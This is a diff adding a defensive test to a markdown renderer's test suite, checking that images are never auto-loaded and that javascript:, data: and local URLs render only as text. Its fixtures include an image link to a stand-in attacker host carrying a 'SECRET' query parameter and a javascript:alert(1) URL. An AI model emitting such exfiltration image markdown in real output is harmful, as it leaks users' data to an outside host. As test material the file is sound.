@@ -288,6 +288,22 @@ describe('GFM reports', () => {
     expect(container.querySelector('img')).toBeNull();
     expect(screen.getByText('危险').getAttribute('href')).not.toMatch(/^javascript:/);
   });
+
+  it.each([undefined, 'share'] as const)('never auto-loads markdown images (variant %s): http(s) become click-through links, others stay text', variant => {
+    const source = ['![秘密](https://attacker.example/p.png?d=SECRET)', '[![徽章](https://img.example/b.svg)](https://example.com/ci)',
+      '![本地](/api/sessions/s1/x.png) ![脚本](javascript:alert(1)) ![](data:image/png;base64,AAAA)', '![引用][r]', '[r]: https://attacker.example/r.png'].join('\n\n');
+    const { container } = render(<MarkdownContent variant={variant}>{source}</MarkdownContent>);
+    expect(container.querySelector('img')).toBeNull();
+    expect(document.head.querySelector('link[rel="preload"]')).toBeNull();
+    const image = screen.getByRole('link', { name: '图片：秘密' });
+    expect(image.getAttribute('href')).toBe('https://attacker.example/p.png?d=SECRET');
+    expect(image.getAttribute('target')).toBe('_blank');
+    expect(image.getAttribute('rel')).toBe('noreferrer');
+    expect(screen.getByRole('link', { name: '图片：徽章' }).getAttribute('href')).toBe('https://example.com/ci');
+    expect(screen.getByRole('link', { name: '图片：引用' }).getAttribute('href')).toBe('https://attacker.example/r.png');
+    expect(container.textContent).toContain('图片：本地 图片：脚本 图片：未命名');
+    expect(screen.getAllByRole('link')).toHaveLength(3);
+  });
 });
 
 describe('CJK emphasis and table line breaks', () => {
